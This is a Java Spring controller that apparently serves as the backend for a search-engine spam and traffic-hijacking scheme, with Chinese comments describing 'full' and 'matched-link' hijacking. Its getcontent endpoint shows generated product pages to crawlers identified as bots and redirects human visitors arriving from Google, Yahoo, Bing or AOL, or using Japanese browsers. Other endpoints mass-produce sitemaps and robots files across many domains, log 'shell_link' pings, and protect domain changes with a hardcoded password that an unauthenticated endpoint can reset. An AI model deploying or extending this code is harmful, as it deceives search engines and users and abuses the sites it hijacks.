package com.gaobug.controller;
import com.alibaba.fastjson.JSON;
import com.gaobug.*;
import com.sun.org.apache.xpath.internal.operations.Bool;
import org.apache.commons.io.FileUtils;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
@Controller
public class ShellController {
    Getsitemapurl getsitemapurl = new Getsitemapurl();
    Map<String, String> readConfigWeb = Textmysql.readConfigSqlTxt("configweb.txt");
    Map<String, String> getcatesmap = Textmysql.readConfigSqlTxt("cate.txt");
    //ArrayList listId = Textmysql.filedata("id.txt");
    ArrayList<String> listId = Textmysql.filedata("newid.txt");
    Map<Integer, Object> idurlmap=Textmysql.idurlmap(listId);
    Map<Object, Integer> urlidmap=Textmysql.urlidmap(listId);
    Integer[] idurlmapkey= (Integer[]) idurlmap.keySet().toArray(new Integer[0]);
    String [] urlidmapkey= (String[]) urlidmap.keySet().toArray(new String[0]);
    int idTotal = listId.size();
    //Map mapId = getsitemapurl.initid(listId, idTotal);
    //Map<Object, Object> readConfigWeb;
    ArrayList listJson = Textmysql.getFileContent("googlejson.txt", false);
    ArrayList<String> hotkeys = Textmysql.filedata("jptitle.txt");
    ArrayList<String> shellflag = Textmysql.filedata("ll.txt");
    int urlcount=Textmysql.urlcount(readConfigWeb);
    Map<String, Object> configmap=Textmysql.fileReadMap("config.txt");
    //int discountnumber[]={30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49};

    //String breadcrumbshtml=getsitemapurl.breadcrumbshtml1(3);
    String breadcrumbshtml= Getsitemapurl.breadcrumbshtml4();
    String breadcrumbshtml1= Getsitemapurl.breadcrumbshtml5();
    String cateurlshtml= Getsitemapurl.cateurls();
    Map maptemplet = Getsitemapurl.inittempletes();
    Map mapcatetemp = Getsitemapurl.getcatetem();
    ArrayList<String> secondarrayList=Textmysql.filedata("second.txt");
    int secondcount=secondarrayList.size();
    String flag="";
    //true 全部劫持 false 匹配连接劫持
    Boolean lockshell=false;
    Boolean soutflag=false;
    Boolean hotkeyflag=true;
    boolean jumpflag=true;
    String stacicpassd="4jnHfEMIje75B";
    String templetesflag=configmap.get("tmp").toString();
    String [] domainkeys = (String[]) readConfigWeb.keySet().toArray(new String[0]);
    String ss=Textmysql.soutsd(urlcount,idTotal,secondarrayList.size());
    String secondname="";
    String style=Textmysql.getstyle("sty.txt");
    @RequestMapping(value = "/test0824")
    @ResponseBody
    String test(HttpServletRequest httpServletRequest){
        return httpServletRequest.getParameter("hostName");
    }
    @RequestMapping(value = "/rss.xml")
    @ResponseBody
    String rss(HttpServletRequest httpServletRequest) {
        String urlorigin=httpServletRequest.getParameter("geturl")==null?"":httpServletRequest.getParameter("geturl");
        urlorigin=urlorigin.replace("/?","");
        urlorigin=urlorigin.replace("/","");
        urlorigin=urlorigin.replace("?","");
        Pattern pattern1=Pattern.compile("^([\\s\\S]*?).php");
        Matcher matcher1=pattern1.matcher(urlorigin);

        if (matcher1.find()) {
            secondname = matcher1.group(0)+"?";
        }else {
            secondname="";
        }
        return getsitemapurl.rsssitemap(httpServletRequest.getParameter("hostName"), readConfigWeb, idTotal,secondname,secondarrayList,shellflag,idurlmap);
    }

    @RequestMapping(value="/configweb.txt")
    @ResponseBody String doconfig(HttpServletRequest httpServletRequest){
        urlcount=Integer.parseInt(httpServletRequest.getParameter("db").trim());
        idTotal=Integer.parseInt(httpServletRequest.getParameter("id"));
        secondcount=Integer.parseInt(httpServletRequest.getParameter("secondcount"));
            Textmysql.init();
        try {
            FileUtils.write(new File("configweb.txt"), "", false);
        } catch (IOException e) {
            e.printStackTrace();
        }
        Map<String, String> domains = Textmysql.readConfigSqlTxt("configsql.txt");
            HashSet<String> hashSet = new HashSet<String>();
            Set<String> keys = domains.keySet();
            for (String key : keys
            ) {
                String rand = Textmysql.rand(urlcount);
                boolean flag = hashSet.add(rand);
                while (!flag) {
                    rand = Textmysql.rand(urlcount);
                    flag = hashSet.add(rand);
                }
                try {
                    FileUtils.write(new File("configweb.txt"), rand + "=>" + domains.get(key) + "\n", true);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                File file = new File("../youtube");
                if (!file.exists())
                    file.mkdirs();
                file = new File("../yahookey");
                if (!file.exists())
                    file.mkdirs();
                file = new File("../googleimage");
                if (!file.exists())
                    file.mkdirs();
            }
            Textmysql.randId(idTotal);
            readConfigWeb = Textmysql.readConfigSqlTxt("configweb.txt");
            domainkeys = (String[]) readConfigWeb.keySet().toArray(new String[0]);
            System.out.println("configweb.txt success");
            Textmysql.getidurl(readConfigWeb);
            listId = Textmysql.filedata("newid.txt");
            idTotal = listId.size();
            idurlmap = Textmysql.idurlmap(listId);
            urlidmap = Textmysql.urlidmap(listId);
            idurlmapkey = (Integer[]) idurlmap.keySet().toArray(new Integer[0]);
            urlidmapkey = (String[]) urlidmap.keySet().toArray(new String[0]);
            System.out.println("newid success");
            Textmysql.randll();
            shellflag = Textmysql.filedata("ll.txt");
            System.out.println("ll.txt success");
            Textmysql.randsecond(secondcount, 10, 99999);
            secondarrayList = Textmysql.filedata("second.txt");
            System.out.println("second.txt succeess");
            return "success!!!";
    }
    @RequestMapping("passdxxx")
    @ResponseBody String changepassd(HttpServletRequest httpServletRequest){
        stacicpassd=httpServletRequest.getParameter("passd");
        return  "new-->"+stacicpassd;
    }
    @RequestMapping("getcate")
    @ResponseBody String getcate(){
        Textmysql.getcates(readConfigWeb);
        System.out.println("cate.txt success");
        return ("cate.txt success");

    }

    //格式 旧域名 \t 新域名
    @RequestMapping(value ="/changeDomain")
    @ResponseBody String changeDomain(HttpServletRequest httpServletRequest) {
        String passd = httpServletRequest.getParameter("passd");
        if (passd.equals(stacicpassd)) {
            ArrayList<String> domains = Textmysql.filedata("changeDomain.txt");
            String regex = "\t";
            String[] readConfigWebkey = (String[]) readConfigWeb.keySet().toArray(new String[0]);
            for (int i = 0; i < domains.size(); i++) {
                String[] arr = domains.get(i).toString().split(regex);
                for (int j = 0; j < readConfigWebkey.length; j++) {
                    if (readConfigWeb.get(readConfigWebkey[j]).equals(arr[0])) {
                        readConfigWeb.put(readConfigWebkey[j], arr[1]);
                        System.out.println(readConfigWebkey[j] + "--->" + arr[1]);
                        File file = new File("../site/" + arr[0]);
                        if (!file.exists()) {
                            System.out.println("file not exist");
                        } else {
                            file.renameTo(new File("../site/" + arr[1]));
                        }
                    }
                }

            }

            try {
                FileUtils.write(new File("configweb.txt"), "", false);
            } catch (IOException e) {
                e.printStackTrace();
            }
            for (String s : readConfigWebkey) {
                String str = s + "=>" + readConfigWeb.get(s);
                try {
                    FileUtils.write(new File("configweb.txt"), str + "\n", true);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return "Change success!!";
        }
        else return "passd Error!!";

    }

    @RequestMapping(value = "temflag")
    @ResponseBody
    String getTempletesflag(HttpServletRequest httpServletRequest){
        templetesflag=httpServletRequest.getParameter("flag");
        System.out.println("templetesflag-->"+templetesflag);
        return "templetesflag-->"+templetesflag;
    }

    @RequestMapping("getnewid")
    @ResponseBody String getnewid(HttpServletRequest httpServletRequest){
        Textmysql.getidurl(readConfigWeb);
        listId = Textmysql.filedata("newid.txt");
        idurlmap=Textmysql.idurlmap(listId);
        urlidmap=Textmysql.urlidmap(listId);
        System.out.println("newid success");
        return "newid success!!";
    }
    @RequestMapping(value = "hotkey")
    @ResponseBody
    String seteHotkeyFlag(HttpServletRequest httpServletRequest){
        hotkeyflag=Boolean.valueOf(httpServletRequest.getParameter("flag"));
        System.out.println("hotkey-->"+hotkeyflag);
        return "hotkey-->"+hotkeyflag;
    }
    @RequestMapping(value = "/checktemp")
    @ResponseBody
    String checktemp(HttpServletRequest httpServletRequest){
        String hostname=httpServletRequest.getParameter("hostname");
        int tempId=0;
        for (int i = 0; i < hostname.length(); i++) {
            tempId += hostname.charAt(i);
        }
        String[] templetes = (String[]) maptemplet.keySet().toArray(new String[0]);
        tempId = tempId % templetes.length;
        System.out.println("tempis----"+templetes[tempId]);
        return "tempis----"+templetes[tempId];
    }
    @RequestMapping(value = "/sitemap")
    @ResponseBody
    String postsitemap(HttpServletRequest httpServletRequest) {
        String urlorigin=httpServletRequest.getParameter("geturl")==null?"":httpServletRequest.getParameter("geturl");
        urlorigin=urlorigin.replace("/?","");
        urlorigin=urlorigin.replace("/","");
        urlorigin=urlorigin.replace("?","");
        Pattern pattern1=Pattern.compile("^([\\s\\S]*?).php");
        Matcher matcher1=pattern1.matcher(urlorigin);
        if (matcher1.find()) {
            secondname = matcher1.group(0)+"?";
        }else {
            secondname="";
        }
        String hostname=httpServletRequest.getParameter("hostName");
        String content=httpServletRequest.getParameter("geturl");
        Pattern pattern=Pattern.compile("sitemap\\d+\\.xml");
        Matcher match=pattern.matcher(content);
        if (match.find()){ //小地图
            flag = Getsitemapurl.getRandflag(httpServletRequest.getParameter("hostName"), shellflag,content);
            return getsitemapurl.echoSitemap(httpServletRequest.getParameter("hostName"), urlidmapkey, flag,secondname);
        }else {
            int count=Textmysql.ASCIcount(hostname);
            int aa=count%50;
            if (aa<20)
                aa+=10;
            return getsitemapurl.maps(aa,httpServletRequest.getParameter("hostName"),secondname);
        }
    }

    @RequestMapping(value = "/shellflag")
    @ResponseBody
    String shellflage(HttpServletRequest httpServletRequest){
        lockshell=Boolean.valueOf(httpServletRequest.getParameter("flag"));
        System.out.println("---->>>"+lockshell);
        return "set shell success!! ---->"+lockshell;
    }
    @RequestMapping(value = "/soutflag")
    @ResponseBody
    String soutflag(HttpServletRequest httpServletRequest){
        soutflag=Boolean.valueOf(httpServletRequest.getParameter("flag"));
        System.out.println("---->>>"+soutflag);
        return "set soutflag success!! ---->"+soutflag;
    }
    @RequestMapping(value = "pingsitemap")
    @ResponseBody
    int pingsitemap(HttpServletRequest httpServletRequest){
        File file=new File("logs/shell_link");
        if (!file.exists())
            file.mkdirs();
        file =new File("bingsitemap");
        if (!file.exists())
            file.mkdirs();

        String hostname=httpServletRequest.getParameter("hostName");
        System.out.println(hostname);
        int count=Textmysql.ASCIcount(hostname);
        int aa=count%10+10;
        Calendar calendar = Calendar.getInstance();
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
        String dat=formatter.format(calendar.getTime());
        formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String time=formatter.format(calendar.getTime());
        String content=time+"--->>>"+httpServletRequest.getParameter("hostName")+"--->>>pingsitemap";
        try {
            FileUtils.write(new File("logs/shell_link/" + dat + ".txt"),content+"\n",true);
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            FileUtils.write(new File("bingsitemap/" + hostname + "-robots.txt"),"");
        } catch (IOException e) {
            e.printStackTrace();
        }
        for (int i = 0; i < aa; i++) {
            try {
                FileUtils.write(new File("bingsitemap/" + hostname + "-robots.txt"),"Sitemap:http://"+hostname+"/sitemap"+i+".xml\n",true);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        System.out.println(aa);
        return aa;
    }
    @RequestMapping(value = "/jumpflag")
    @ResponseBody
    String shelljumpflag(HttpServletRequest httpServletRequest){
        if (httpServletRequest.getParameter("passwd").equals("4jnHfEMIje75B")) {
            jumpflag = Boolean.valueOf(httpServletRequest.getParameter("flag"));
            System.out.println("---->>>" + lockshell);
            return "set shell success!! ---->" + lockshell;
        }else {
            return "passwd wromng";
        }
    }

    @RequestMapping(value="/getcates")
    @ResponseBody String getcates(HttpServletRequest httpServletRequest){
        String hostname=httpServletRequest.getParameter("hostName")==null?"":httpServletRequest.getParameter("hostName");
        String urlorigin = httpServletRequest.getParameter("geturl")==null?"":httpServletRequest.getParameter("geturl");
        urlorigin=urlorigin.replace("/?","");
        urlorigin=urlorigin.replace("/","");
        urlorigin=urlorigin.replace("?","");
        urlorigin=urlorigin.replace(".html","");
        Pattern pattern1=Pattern.compile("^([\\s\\S]*?).php");
        Matcher matcher1=pattern1.matcher(urlorigin);
        if (matcher1.find()) {
            secondname = matcher1.group(0)+"?";
        }else {
            secondname="";
        }
        urlorigin=urlorigin.replaceAll("([\\s\\S]*?).php","");
        if (urlorigin.contains("cate-")){

        }
        return "";
    }
    @RequestMapping(value = "/getcontent")
    @ResponseBody
    String postcontent(HttpServletRequest httpServletRequest) {
        Calendar calendar = Calendar.getInstance();
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        String time=formatter.format(calendar.getTime());
        //本连接
        //Map webConfig=stringRedisTemplate.opsForHash().entries("webConfig");
        //0数据 1 url
        //String urlorigin = tt.getGeturl();
        String hostname=httpServletRequest.getParameter("hostName")==null?"":httpServletRequest.getParameter("hostName");
        String urlorigin = httpServletRequest.getParameter("geturl")==null?"":httpServletRequest.getParameter("geturl");
        String befou=hostname+urlorigin;
        //String urlRefer = tt.getUrlrefer();

        String urlRefer = httpServletRequest.getParameter("urlrefer")==null?"":httpServletRequest.getParameter("urlrefer");
        String useagent = httpServletRequest.getParameter("userAgent")==null?"":httpServletRequest.getParameter("userAgent");
        String browserlanguge=httpServletRequest.getParameter("blowser")==null?"":httpServletRequest.getParameter("blowser");
        urlorigin=urlorigin.replace("/?","");
        urlorigin=urlorigin.replace("/","");
        urlorigin=urlorigin.replace("?","");
        urlorigin=urlorigin.replace(".html","");
        Pattern pattern1=Pattern.compile("^([\\s\\S]*?).php");
        Matcher matcher1=pattern1.matcher(urlorigin);
        if (matcher1.find()) {
            secondname = matcher1.group(0)+"?";
        }else {
            secondname="";
        }
        urlorigin=urlorigin.replaceAll("([\\s\\S]*?).php","");
        String cateurl=urlorigin;
        //不符合返回符合连接 符合原链接返回
        // System.out.println("url:::"+tt.getGeturl());
        //来源判断
        if(useagent!=null&&useagent.equals("bot")){
            //检查链接返回正确原链接
            urlorigin = Getsitemapurl.checkurlnew(urlorigin, readConfigWeb, hostname,soutflag,idurlmap,idurlmapkey,urlcount,befou);
           // System.out.println("urlorigin"+urlorigin);
            //content 0获取数据 1url去除后面多余内容 zdztqmn49
            List content = Getsitemapurl.getProductTxt(urlorigin, readConfigWeb, idTotal);
            //shell标示符 首页非首页区分过滤www. 非空
            //flag = Getsitemapurl.getRandflag(hostname, shellflag,urlorigin);
           // System.out.println("content.get"+content.get(1));
            String url = content.get(1).toString();
            int cateid= Textmysql.ASCIcount(url)%getcatesmap.size();
            int cateid1= (Textmysql.ASCIcount(url)+1)%getcatesmap.size();
            //获取下一条连接
            //String nexturl = Getsitemapurl.getNexturlnew(url, urlidmap, idurlmap,true);
            //String randurl=Getsitemapurl.getNexturlnew(url, urlidmap, idurlmap,false);
            //randurl=randurl;
            //链接zdztqmn49merryfa206
            //url+=flag;
            //nexturl = nexturl ;
            String cate2url="goodcatesxshl/cate-"+cateid;
            String cate3url="goodcatesxshl/cate-"+cateid1;
            Map dataMap = (Map) JSON.parse((String) content.get(0));
            //填html
            int tempId = 0;
           // System.out.println("url---->"+url);
            if (templetesflag.equals("true")) {
                for (int i = 0; i < url.length(); i++) {
                    tempId += url.charAt(i);
                }
            }else{
                if (hostname.length()>0){
                    for (int i = 0; i < hostname.length(); i++) {
                        tempId += hostname.charAt(i);
                    }
                }else {
                    for (int i = 0; i < url.length(); i++) {
                        tempId += url.charAt(i);
                    }
                    System.out.println("hostname length less0");
                }
            }
            //int tempId = Integer.parseInt(String.valueOf(dataMap.get("product_id")));
            String[] templetes = (String[]) maptemplet.keySet().toArray(new String[0]);
            //获取Redis 缓存
           // Map urlnameimge = stringRedisTemplate.opsForHash().entries("urlnameimge");
            tempId = tempId % templetes.length;
            //System.out.println(url+templetes[tempId]);

            String html = (String) maptemplet.get(templetes[tempId]);
            //模板处理
            //html=html.replaceAll("<meta http-equiv=\"Refresh\"([\\s\\S]*?)>","");
            html = html.replace("{#breadcrumbs}",breadcrumbshtml);
            html = html.replace("{#breadcrumbs1}",breadcrumbshtml1);
            html=html.replace("{#templete}",templetes[tempId]);
            long start = new Date().getTime();
            pattern1=Pattern.compile("^goodcatesxshlcate-(\\d+)");
             matcher1=pattern1.matcher(cateurl);
            if (matcher1.find()) {
                html=mapcatetemp.get("cate.html").toString();
                html= cates.setHtml(dataMap,getcatesmap,befou,html,hostname,secondname,cateurlshtml,readConfigWeb,idTotal,cateurl,hotkeys,idurlmap);
            }else {
            try {
                html= Html_231010.setHtml(dataMap, url, cate2url, hostname, html, listJson, readConfigWeb, idTotal, hotkeys
                        ,shellflag,hotkeyflag,secondname,idurlmap,secondarrayList,style,cate3url,befou);
                //                html= Html_231010.setHtml(dataMap, url, cate2url, hostname, html, listJson, readConfigWeb, idTotal, hotkeys
//                        ,shellflag,hotkeyflag,secondname,idurlmap,secondarrayList,style,cate3url,befou);
            } catch (Exception e) {
                System.out.println(templetes[tempId]);
                System.out.println(url);
                e.printStackTrace();
            }
            }
            long timeend=new Date().getTime()-start;
            if (soutflag)
            System.out.println(hostname+" -->"+time+"-->bot coming"+timeend+"-->"+url);
            return html;
        }
        else {
//            String res = Getsitemapurl.writeLog(urlorigin, httpServletRequest.getParameter("remoteAddress"), hostname, readConfigWeb);
//            return res;
//        }
        //else if (urlRefer.indexOf("google") >= 0 || urlRefer.indexOf("yahoo") >= 0 || urlRefer.indexOf("bing") >= 0 || urlRefer.indexOf("aol") >= 0) {
        //else if (urlRefer.indexOf("google") >= 0 || urlRefer.indexOf("yahoo") >= 0 || urlRefer.indexOf("bing") >= 0 || urlRefer.indexOf("aol") >= 0) {
            urlorigin=urlorigin.replaceAll("^(\\d+)","");
            urlorigin=urlorigin.replace("-","");
            String Rexg = "^([a-z]){"+urlcount+"}(\\d+)(.*)";
            Pattern pattern = Pattern.compile(Rexg);
            Matcher match = pattern.matcher(urlorigin);
            String ip=httpServletRequest.getParameter("remoteAddress");
            if (jumpflag) {
                if (lockshell) {//全劫持
                    if (!match.find()) {
                        if (ip.length() > 0) {
                            urlorigin = urlorigin + ip;
                        }
                        if (soutflag)
                            System.out.println("不跳...." + urlorigin);
                        urlorigin = Getsitemapurl.checkurlnew(urlorigin, readConfigWeb, hostname, soutflag, idurlmap, idurlmapkey, urlcount, befou);
                    }
                    String res = Getsitemapurl.writeLog(urlorigin, ip, hostname, readConfigWeb, urlRefer);
                    return res;
                } else {//匹配劫持
                    if (urlRefer.contains("google") || urlRefer.contains("yahoo") || urlRefer.contains("bing") || urlRefer.contains("aol")) {
                    //if (match.find() || browserlanguge.equals("ja") || browserlanguge.indexOf("ja") == 0) {
                    if (match.find() || browserlanguge.contains("ja")) {
                        Map domainIndentifier = Getsitemapurl.getDbnameId(urlorigin);
                        if (readConfigWeb.get(domainIndentifier.get("db")) == null) {
                            //urlorigin = getsitemapurl.randurl(urlorigin, readConfigWeb, idTotal, hostname, soutflag);
                            int id = (int) (Math.random() * idurlmapkey.length);
                            urlorigin = idurlmap.get(id).toString();
                            //System.out.println(urlorigin);
                            //System.out.println("jmprandurl-->"+urlorigin);
                        }
                        String res = Getsitemapurl.writeLog(urlorigin, ip, hostname, readConfigWeb, urlRefer);
                        return res;
                    } else {
                        if (soutflag)
                            System.out.println("不跳...." + urlorigin);
                        return "";
                    }
                }else {
                    //System.out.println("urlRefer---->" + urlRefer);
                    return "";
                }
                //}
            }
            }
           // }
            else
                return "";
        }
        //else
        //return "";
    }
}
